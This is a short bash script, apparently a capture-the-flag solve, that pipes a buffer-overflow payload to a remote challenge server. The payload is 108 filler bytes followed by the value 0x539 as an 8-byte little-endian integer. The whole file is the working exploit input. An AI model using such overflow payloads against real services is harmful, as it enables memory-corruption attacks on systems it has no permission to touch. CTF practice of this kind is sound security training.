#!/bin/bash
python3 -c "import sys; sys.stdout.buffer.write(b'A' * 108 + (0x539).to_bytes(8, 'little'))" | sc undutmaning-beep.chals.io
